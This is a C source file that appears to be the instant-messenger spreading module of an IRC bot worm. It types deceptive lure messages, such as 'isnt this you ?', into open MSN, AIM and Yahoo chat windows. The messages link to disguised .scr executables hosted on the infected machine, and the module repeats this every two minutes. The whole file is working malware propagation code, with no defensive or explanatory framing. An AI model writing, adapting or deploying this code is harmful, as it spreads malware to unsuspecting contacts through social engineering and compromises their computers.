#include "../header/includes.h"  // added by memcpy !
#include "../header/functions.h"
#include "../header/externs.h"

#ifndef NO_IMSPREAD
//globals
#ifndef NO_IMSPREADER
int spread_delay=120000;
#endif

#ifndef NO_IMSPREADER

DWORD WINAPI IMSpreadThread(LPVOID param) {
	IMPARAM imparam = *((IMPARAM *)param);

	int threadnum=imparam.threadnum;

	while (1) {
		IMSpread(imparam.ip, NULL);
		Sleep(spread_delay);
	}
	clearthread(threadnum);

	ExitThread(0);
}
#endif


void IMSpread(char *ip,char *text) {
	char IMmsg[IRCLINE], *botfiles[]= {
		"funny3.scr",
		"crazyjump.scr",
		"lucky.scr",
		"mjackson.scr",
		"picture1.scr",
		"haha.scr",
		"funny1.scr",
		"funny2.scr",
		"exposed.scr",
		"crazy5.scr"
	}, *text2[] = {
		"LOL, this shit is funny",
		"lol, don't forget to watch this video",
		"your going to like this :D",
		"hehe, watch this",
		"look at this video",
		"c'est toi?",
		"try this",
		"isnt this you ?",
		"download and play with me!"
	};

	if (text) {
		EnumWindows(EnumMSN, (LPARAM)&text);
		EnumWindows(EnumAIM, (LPARAM)&text);
		EnumWindows(EnumYahoo, (LPARAM)&text);
	} else {
		_snprintf(IMmsg,sizeof(IMmsg),"%s http://%s:%d/%s", text2[randnum(sizeof(text)/sizeof(LPTSTR))], ip, httpport, botfiles[randnum(sizeof(botfiles)/sizeof(LPTSTR))]); 
		EnumWindows(EnumMSN, (LPARAM)&IMmsg);

		_snprintf(IMmsg,sizeof(IMmsg),"%s http://%s:%d/%s", text2[randnum(sizeof(text)/sizeof(LPTSTR))], ip, httpport, botfiles[randnum(sizeof(botfiles)/sizeof(LPTSTR))]); 
		EnumWindows(EnumAIM, (LPARAM)&IMmsg);

		_snprintf(IMmsg,sizeof(IMmsg),"%s http://%s:%d/%s", text2[randnum(sizeof(text)/sizeof(LPTSTR))], ip, httpport, botfiles[randnum(sizeof(botfiles)/sizeof(LPTSTR))]); 
		EnumWindows(EnumYahoo, (LPARAM)&IMmsg);
	}
}
BOOL CALLBACK EnumAIMChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	char IMText[55];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"Ate32Class"))
	{
		SendMessage(hwnd,WM_GETTEXT,sizeof(IMText),(LPARAM)IMText);
		if(IMText[55]=='E'||IMText[0]!='<')
		{
			SendMessage(hwnd,WM_SETTEXT,0,lParam); 
			SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
		}
	}
	return true;
}

BOOL CALLBACK EnumAIM(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"AIM_IMessage"))
		EnumChildWindows(hwnd,EnumAIMChild,lParam);
	return true;
}

BOOL CALLBACK EnumMSNChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	char IMText[8];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"RichEdit20W"))
	{
		SendMessage(hwnd,WM_GETTEXT,sizeof(IMText),(LPARAM)IMText);
		if(strcmp(IMText,"  Never\0"))
		{
			SendMessage(hwnd,WM_SETTEXT,0,lParam); 
			SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
		}
	}
	return true;
}


BOOL CALLBACK EnumMSN(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"IMWindowClass"))
		EnumChildWindows(hwnd,EnumMSNChild,lParam);
	return true;
}

BOOL CALLBACK EnumYahooChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"RICHEDIT"))
	{
		SendMessage(hwnd,WM_SETTEXT,0,lParam); 
		SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
		SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
	}
	return true;
}


BOOL CALLBACK EnumYahoo(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"IMClass"))
		EnumChildWindows(hwnd,EnumYahooChild,lParam);
	return true;
}
 #endif